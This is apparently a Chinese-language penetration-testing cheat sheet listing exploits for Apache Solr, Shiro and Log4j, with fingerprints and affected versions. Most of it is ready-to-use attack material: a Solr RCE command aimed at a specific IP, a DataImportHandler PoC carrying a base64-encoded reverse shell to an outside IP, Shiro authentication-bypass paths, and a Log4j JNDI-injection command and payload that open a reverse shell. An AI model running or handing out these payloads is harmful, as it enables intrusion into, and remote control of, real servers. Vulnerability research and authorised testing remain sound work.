## Solr

主要基于HTTP和Apache Lucene实现的全文搜索服务器。
历史漏洞 https://avd.aliyun.com/search?q=Solr
黑盒特征：图标及端口8393
![Solr](Solr-ico.png)
### 命令执行（CVE-2019-17558）

Apache Solr 5.0.0版本至8.3.1

https://github.com/jas502n/solr_rce

```
python solr_rce.py http://123.58.236.76:50847 id
```

### 远程命令执行漏洞(CVE-2019-0193)

Apache Solr < 8.2.0版本

条件1：Apache Solr的DataImportHandler启用了模块DataImportHandler(默认不会被启用)
条件2：Solr Admin UI未开启鉴权认证。（默认情况无需任何认证）

选择已有核心后选择Dataimport功能并选择debug模式，更改填入以下POC，点击Execute with this Confuguration

```
<dataConfig>
  <dataSource type="URLDataSource"/>
  <script><![CDATA[
          function poc(){ java.lang.Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45NC4yMzYuMTE3LzU1NjYgMD4mMQ==}|{base64,-d}|{bash,-i}");
          }
  ]]></script>
  <document>
    <entity name="stackoverflow"
            url="https://stackoverflow.com/feeds/tag/solr"
            processor="XPathEntityProcessor"
            forEach="/feed"
            transformer="script:poc" />
  </document>
</dataConfig>
```

*注意Base64字符串是反弹命令*

### 认证绕过漏洞（CVE-2024-45216）

参考 https://mp.weixin.qq.com/s/Ke3hzJ2iGSekrsFpZV263w

```
GET /solr/admin/info/properties:/admin/info/key
```

### 文件上传路径遍历漏洞（CVE-2024-52012）

参考 https://mp.weixin.qq.com/s/uYGLIcu0VUA3sB6heBUBrg

## Shiro

Java安全框架，能够用于身份验证、授权、加密和会话管理。
历史漏洞 https://avd.aliyun.com/search?q=Shiro
黑盒特征：数据包cookie里面rememberMe

### CVE_2016_4437 Shiro-550+Shiro-721

影响范围：Apache Shiro <= 1.2.4

工具箱利用项目搜哈

### CVE-2020-11989

影响范围：Apache Shiro < 1.7.1

Poc  /admin/%20

### CVE-2020-1957

影响范围：Apache Shiro < 1.5.3

Poc：/xxx/..;/admin/

### CVE-2022-32532

需要依赖代码具体写法，无法自动化，风险较低。
影响范围：Apache Shiro < 1.9.1

Poc： /permit/any

/permit/a%0any可绕过

## Log4j

Apache的一个开源项目，是一个基于Java的日志记录框架。
历史漏洞：https://avd.aliyun.com/search?q=Log4j
黑盒特征：盲打 会问蓝队攻击特征（${jndi:rmi:///osutj8}）

### Log4j2远程命令执行（CVE-2021-44228）

漏洞影响的产品版本包括：
Apache Log4j2 2.0 - 2.15.0-rc1

生成反弹Shell的JNDI注入

```
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45NC4yMzYuMTE3Lzk5MDAgMD4mMQ==}|{base64,-d}|{bash,-i}" -A 47.94.236.117
```

构造JNDI注入Payload提交

```
${jndi:rmi://47.94.236.117:1099/osutj8}
```

### JNDI注入jdk高版本绕过

https://github.com/B4aron1/JNDIBypass
https://mp.weixin.qq.com/s/rxcnKAaBCDp9FHKO8eWYlQ